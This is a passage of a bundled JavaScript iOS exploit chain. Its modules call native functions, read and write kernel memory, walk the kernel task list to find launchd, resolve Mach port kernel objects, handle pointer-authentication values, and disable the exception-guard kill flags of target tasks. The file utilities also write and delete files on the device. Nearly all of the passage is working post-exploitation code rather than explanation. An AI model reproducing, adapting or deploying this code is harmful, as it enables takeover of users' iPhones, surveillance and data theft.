0x0400;\nconst O_EVTONLY\t= 0x8000;\n\nconst ERROR\t\t= -1;\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nconst SEEK_SET = 0;\n\nclass FileUtils {\n\n\n\tstatic open(path) {\n\t\tconst fd = Native.callSymbol(\"open\", path, O_RDONLY);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\t\treturn fd;\n\t}\n\n\tstatic close(fd) {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n\n\tstatic read(fd, size=0) {\n\t\tif (!size || size > Native.memSize)\n\t\t\tsize = Native.memSize;\n\t\tconst len = Native.callSymbol(\"read\", fd, Native.mem, size);\n\t\tif (!len || len == ERROR)\n\t\t\treturn false;\n\t\tconst buff = Native.read(Native.mem, len);\n\t\treturn buff;\n\t}\n\n\tstatic readFile(path, seek=0, length=0) {\n\t\tconst fd = this.open(path);\n\t\tif (fd === false)\n\t\t\treturn null;\n\n\t\tlet data = new Uint8Array();\n\n\t\tif (seek)\n\t\t\tNative.callSymbol(\"lseek\", fd, seek, SEEK_SET);\n\n\t\tlet remaining = length;\n\n\t\twhile (true) {\n\t\t\tlet size = remaining ? remaining : Native.memSize;\n\t\t\tif (size > Native.memSize)\n\t\t\t\tsize = Native.memSize;\n\t\t\tconst buff = this.read(fd, size);\n\t\t\tif (buff === false)\n\t\t\t\tbreak;\n\t\t\tconst buff8 = new Uint8Array(buff);\n\t\t\tlet newData = new Uint8Array(data.length + buff8.length);\n\t\t\tnewData.set(data, 0);\n\t\t\tnewData.set(buff8, data.length);\n\t\t\tdata = newData;\n\n\t\t\tif (remaining) {\n\t\t\t\tremaining -= buff.byteLength;\n\t\t\t\tif (!remaining)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tthis.close(fd);\n\n\t\treturn data.buffer;\n\t}\n\n\tstatic writeFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);\n\t}\n\n\tstatic appendFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_APPEND);\n\t}\n\n\tstatic deleteFile(path) {\n\t\tNative.callSymbol(\"unlink\", path);\n\t}\n\tstatic foreachDir(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\n\tstatic foreachFile(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t\treturn true;\n\t}\n\n\tstatic createDir(path, permission=0o755) {\n\t\treturn !Native.callSymbol(\"mkdir\", path, permission);\n\t}\n\n\tstatic deleteDir(path, recursive=false) {\n\t\tif (recursive) {\n\t\t\tconst dir = Native.callSymbol(\"opendir\", path);\n\t\t\tif (!dir) {\n\t\t\t\tconsole.log(TAG, \"deleteDir: Unable to open dir: \" + path);\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\twhile (true) {\n\t\t\t\tconst item = this.#readdir(dir);\n\t\t\t\tif (!item)\n\t\t\t\t\tbreak;\n\n\t\t\t\tconst newPath = path + '/' + item.d_name;\n\n\t\t\t\tswitch (item.d_type) {\n\t\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tthis.deleteDir(newPath, true);\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\t\tconsole.log(TAG, `deleting: ${newPath}`);\n\t\t\t\t\t\tthis.deleteFile(newPath);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\n\t\treturn !Native.callSymbol(\"rmdir\", path);\n\t}\n\n\tstatic exists(path, permission=0/*F_OK*/) {\n\t\treturn !Native.callSymbol(\"access\", path, permission);\n\t}\n\n\tstatic stat(path) {\n\t\tconst ret = Native.callSymbol(\"stat\", path, Native.mem);\n\t\tif (ret == ERROR)\n\t\t\treturn null;\n\t\tconst buff = Native.read(Native.mem, 144);\n\t\tconst view = new DataView(buff);\n\n\t\tconst dev = view.getInt32(0, true);\n\t\tconst mode = view.getUint16(0x4, true);\n\t\tconst nlink = view.getUint16(0x6, true);\n\t\tconst ino = view.getBigUint64(0x8, true);\n\t\tconst uid = view.getUint32(0x10, true);\n\t\tconst gid = view.getUint32(0x14, true);\n\t\tconst atime_tv_sec = view.getBigInt64(0x20, true);\n\t\tconst mtime_tv_sec = view.getBigInt64(0x30, true);\n\t\tconst ctime_tv_sec = view.getBigInt64(0x40, true);\n\t\tconst size = view.getBigInt64(0x60, true);\n\n\t\treturn {\n\t\t\tmode: Number(mode),\n\t\t\tino: Number(ino),\n\t\t\tdev: Number(dev),\n\t\t\tnlink: Number(nlink),\n\t\t\tuid: Number(uid),\n\t\t\tgid: Number(gid),\n\t\t\tsize: Number(size),\n\t\t\tatime: Number(atime_tv_sec),\n\t\t\tmtime: Number(mtime_tv_sec),\n\t\t\tctime: Number(ctime_tv_sec)\n\t\t};\n\t}\n\n\tstatic #readdir(dir) {\n\t\tconst itemPtr = Native.callSymbol(\"readdir\", dir);\n\t\tif (!itemPtr)\n\t\t\treturn null;\n\n\t\tconst item = Native.read(itemPtr, 24);\n\t\tconst view = new DataView(item);\n\n\t\tconst d_ino = view.getBigUint64(0, true);\n\t\tconst d_namlen = view.getUint16(18, true);\n\t\tconst d_type = view.getUint8(20);\n\t\tconst d_name = Native.readString(itemPtr + 21n, d_namlen + 1);\n\n\t\treturn {\n\t\t\td_ino: d_ino,\n\t\t\td_type: d_type,\n\t\t\td_name: d_name\n\t\t};\n\t}\n\n\tstatic #commonWriteFile(path, data, flags) {\n\t\tconst fd = Native.callSymbol(\"open\", path, flags, 0o644);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\t// For some reason file mode is not applied on open()\n\t\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\t\tlet offs = 0;\n\t\tlet left = data.byteLength;\n\n\t\tconst buffSize = 0x4000;\n\t\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\t\twhile (true) {\n\t\t\tconst size = left > buffSize ? buffSize : left;\n\t\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\t\tconst dst8 = new Uint8Array(src8);\n\t\t\tNative.write(buffPtr, dst8.buffer);\n\t\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\t\tif (!len || len == ERROR)\n\t\t\t\tbreak;\n\t\t\toffs += len;\n\t\t\tleft -= len;\n\t\t\tif (!left)\n\t\t\t\tbreak;\n\t\t}\n\n\t\tNative.callSymbol(\"free\", buffPtr);\n\t\tNative.callSymbol(\"close\", fd);\n\n\t\treturn true;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/Logger.js\":\n/*!************************************!*\\\n  !*** ./src/libs/JSUtils/Logger.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Logger)\n/* harmony export */ });\n/* harmony import */ var _FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./FileUtils */ \"./src/libs/JSUtils/FileUtils.js\");\n/* harmony import */ var _Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\nclass Logger {\n\n\tstatic #logging = false;\n\tstatic #logfile = \"/private/var/mobile/Media/PostLogs.txt\";\n\n\tstatic {\n\t\t//LOG(\"Log file: \" + Logger.#logfile);\n\t}\n\n\tstatic log(TAG, msg) {\n\t\t// Avoid recursive logging\n\t\tif (Logger.#logging)\n\t\t\treturn;\n\t\tLogger.#logging = true;\n\t\tconst logMsg = `[${TAG}] ${msg}`;\n\n\t\tLOG(logMsg);\n\n\t\tif (false) // removed by dead control flow\n{}\n\t\tLogger.#logging = false;\n\t}\n\n\tstatic clearPreviousLogs(){\n\t\t_Chain_Native__WEBPACK_IMPORTED_MODULE_1__[\"default\"].callSymbol(\"unlink\", Logger.#logfile);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/Utils.js\":\n/*!***********************************!*\\\n  !*** ./src/libs/JSUtils/Utils.js ***!\n  \\***********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Utils)\n/* harmony export */ });\n\n\nconst TAG = \"UTILS\";\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nclass Utils {\n\n\tstatic UINT64_SIZE = 8;\n\tstatic UINT32_SIZE = 4;\n\tstatic UINT16_SIZE = 2;\n\tstatic ARM_THREAD_STATE64 = 6;\n\tstatic ARM_THREAD_STATE64_SIZE = 0x110;\n\tstatic ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);\n\tstatic ptrauth_key_asia = 0;\n\tstatic EXC_BAD_ACCESS = 1n;\n\tstatic EXC_GUARD = 12n;\n\tstatic EXC_MASK_GUARD = (1n << this.EXC_GUARD);\n\tstatic EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);\n\tstatic EXCEPTION_STATE = 2n;\n\tstatic MACH_EXCEPTION_CODES = 0x80000000n;\n\tstatic PAGE_SIZE = 0x4000n;\n\tstatic PAGE_MASK = (this.PAGE_SIZE - 1n);\n\n\tstatic hex(val) {\n\t\treturn val.toString(16);\n\t}\n\n\tstatic memmem(haystack, needle) {\n\t\tconst hLen = haystack.byteLength;\n\t\tconst nLen = needle.byteLength;\n\n\t\tif (nLen === 0 || hLen < nLen) {\n\t\t  return 0;\n\t\t}\n\n\t\tconst haystackView = new Uint8Array(haystack);\n\t\tconst needleView = new Uint8Array(needle);\n\n\t\tfor (let i = 0; i <= hLen - nLen; i++) {\n\t\t  let found = true;\n\t\t  for (let j = 0; j < nLen; j++) {\n\t\t\tif (haystackView[i + j] !== needleView[j]) {\n\t\t\t  found = false;\n\t\t\t  break;\n\t\t\t}\n\t\t  }\n\t\t  if (found) {\n\t\t\treturn i;\n\t\t  }\n\t\t}\n\n\t\treturn 0;\n\t}\n\n\tstatic ptrauth_string_discriminator(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbedn;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_string_discriminator_special(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481000000000000n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3000000000000n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbed000000000000n;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517000000000000n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_blend_discriminator(diver,discriminator)\n\t{\n\t\treturn diver & 0xFFFFFFFFFFFFn | discriminator;\n\t}\n\n    static printArrayBufferInChunks(buffer) {\n        const view = new DataView(buffer);\n        const chunkSize = 8;\n\n        for (let i = 0; i < buffer.byteLength; i += chunkSize) {\n\t\t\t// Read the chunk as a BigInt\n\t\t\tconst chunk = view.getBigUint64(i, true); // Little-endian\n\n            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);\n        }\n    }\n\n\tstatic MIN(a, b)\n\t{\n\t\tif(a < b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n\n\tstatic MAX(a, b)\n\t{\n\t\tif(a > b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/RegistersStruct.js\":\n/*!*********************************************!*\\\n  !*** ./src/libs/TaskRop/RegistersStruct.js ***!\n  \\*********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ RegistersStruct)\n/* harmony export */ });\nconst TAG = \"REGISTERSSTRUCT\"\n\nclass RegistersStruct\n{\n\t#dataView;\n\n\tconstructor(buffer, offset = 0, length = 29) {\n\t\tthis.#dataView = new DataView(buffer,offset, length * 8);\n\t\tthis.length = length;\n\t}\n    \n\tget(index) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in get:${index}`);\n\t\t\treturn;\n        }\n        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian\n    }\n\n    set(index, value) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in set`);\n\t\t\treturn;\n        }\n        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian\n    }\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/SelfTaskStruct.js\":\n/*!********************************************!*\\\n  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!\n  \\********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ SelfTaskStruct)\n/* harmony export */ });\nclass SelfTaskStruct \n{\n\t#buffer;\n\t#dataView;\n\tconstructor()\n\t{\n\t\tthis.#buffer = new ArrayBuffer(32);\n\t\tthis.#dataView = new DataView(this.#buffer);\n\t\tthis.addr = 0x0n;\n\t\tthis.spaceTable = 0x0n;\n\t\tthis.portObject = 0x0n;\n\t\tthis.launchdTask = 0x0n;\n\t}\n\tget addr()\n\t{\n\t\treturn this.#dataView.getBigUint64(0,true);\n\t}\n\tset addr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(0,value,true);\n\t}\n\tget spaceTable()\n\t{\n\t\treturn this.#dataView.getBigUint64(8,true);\n\t}\n\tset spaceTable(value)\n\t{\n\t\tthis.#dataView.setBigUint64(8,value,true);\n\t}\n\tget portObject()\n\t{\n\t\treturn this.#dataView.getBigUint64(16,true);\n\t}\n\tset portObject(value)\n\t{\n\t\tthis.#dataView.setBigUint64(16,value,true);\n\t}\n\tget launchdTask()\n\t{\n\t\treturn this.#dataView.getBigUint64(24,true);\n\t}\n\tset launchdTask(value)\n\t{\n\t\tthis.#dataView.setBigUint64(24,value,true);\n\t}\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/Task.js\":\n/*!**********************************!*\\\n  !*** ./src/libs/TaskRop/Task.js ***!\n  \\**********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Task)\n/* harmony export */ });\n/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ \"./src/libs/TaskRop/SelfTaskStruct.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst TAG = \"TASK\"\nconst TASK_EXC_GUARD_MP_CORPSE = 0x40;\nconst TASK_EXC_GUARD_MP_FATAL = 0x80;\nconst TASK_EXC_GUARD_MP_DELIVER = 0x10;\n\nclass Task\n{\n\tstatic gSelfTask;\n\tstatic KALLOC_ARRAY_TYPE_SHIFT;\n\n\tstatic {\n\t\tthis.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t}\n\n\tstatic init(selfTaskAddr)\n\t{\n\t\t// Update KALLOC_ARRAY_TYPE_SHIFT\n\t\tthis.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().T1SZ_BOOT - 1n));\n\n\t\t/*\n\t\t * This function should be invoked as the initializer of the this Task utility.\n\t\t * It setups the global var \"gSelfTask\" containing values used all across the task functions to lookup ports.\n\t\t * It also retrieves the \"launchd\" task address.\n\t\t */\n\t\tthis.gSelfTask.addr = selfTaskAddr;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\tthis.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);\n\t\tthis.gSelfTask.launchdTask = this.#searchForLaunchdTask();\n\n\t\tconsole.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.addr)}`);\n\t\tconsole.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(spaceTable)}`);\n\t\tconsole.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.portObject)}`);\n\t\tconsole.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.launchdTask)}`);\n\t}\n\n\tstatic trunc_page(addr)\n\t{\n\t\treturn addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic round_page(addr)\n\t{\n\t\treturn this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic pidof(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\t\treturn pid;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic getTaskAddrByPID(pid)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == pid)\n\t\t\t\treturn currTask;\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || (nextTask == currTask))\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic disableExcGuardKill(taskAddr)\n\t{\n\t\t// in mach_port_guard_ast, the victim would crash if these are on.\n\t\tlet excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard);\n\t\t//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);\n\t\texcGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);\n\t\texcGuard |= TASK_EXC_GUARD_MP_DELIVER;\n\t\t//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard, excGuard);\n\t}\n\n\tstatic getTaskAddrByName(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\t//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\t//console.log(TAG, `Found target process: ${name}`);\n\t\t\t\treturn currTask;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn false;\n\t}\n\n\tstatic getRightAddr(port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortEntry(spaceTable, port);\n\t}\n\n\tstatic #getSpaceTable(taskAddr)\n\t{\n\t\tlet space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().ipcSpace);\n\t\tlet spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().spaceTable);\n\t\t//console.log(TAG,`space: ${Utils.hex(space)}`);\n\t\t//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);\n\t\tspaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(spaceTable);\n\t\t//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);\n\t\treturn this.#kallocArrayDecodeAddr(BigInt(spaceTable));\n\t}\n\n\tstatic #mach_port_index(port)\n\t{\n\t\treturn ((port) >> 8n);\n\t}\n\n\tstatic #getPortEntry(spaceTable, port)\n\t{\n\t\tlet portIndex = this.#mach_port_index(port);\n\t\treturn spaceTable + (portIndex * 0x18n);\n\t}\n\n\tstatic #getPortObject(spaceTable, port)\n\t{\n\t\t//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);\n\t\tlet portEntry = this.#getPortEntry(spaceTable, port);\n\t\t//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);\n\t\tlet portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().entryObject);\n\t\t//console.log(TAG,`portObject:${Utils.hex(portObject)}`);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(portObject);\n\t}\n\n\tstatic getTaskProc(taskAddr)\n\t{\n\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().procRO);\n\t\tlet procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\treturn procAddr;\n\t}\n\n\tstatic #searchForLaunchdTask()\n\t{\n\t\t/*\n\t\t * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.\n\t\t */\n\n\t\tlet currTask = this.gSelfTask.addr;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == 1)\n\t\t\t\treturn currTask;\n\t\t\tlet prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().prevTask);\n\t\t\tif (!prevTask || prevTask === currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = prevTask;\n\t\t}\n\t\treturn 0n;\n\t}\n\n\tstatic #kallocArrayDecodeAddr(ptr)\n\t{\n\t\tlet zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);\n\t\tif (ptr & zone_mask)\n\t\t{\n\t\t\tptr &= ~0x1fn;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_MASK;\n\t\t\t//console.log(TAG,`ptr:${Utils.hex(ptr)}`);\n\t\t\tptr |= zone_mask;\n\t\t\t//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);\n\t\t}\n\t\treturn ptr;\n\t}\n\n\tstatic getPortAddr(port)\n\t{\n\t\tif (!port)\n\t\t\treturn 0;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n\n\tstatic getPortKObject(port)\n\t{\n\t\tlet portObject = this.getPortAddr(port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic #getPortKObjectByAddr(portObject)\n\t{\n\t\tif (!portObject)\n\t\t\treturn 0;\n\t\tlet kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().objectKObject);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(kobject);\n\t}\n\n\tstatic firstThread(taskAddr)\n\t{\n\t\tlet first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().threads);\n\t\treturn 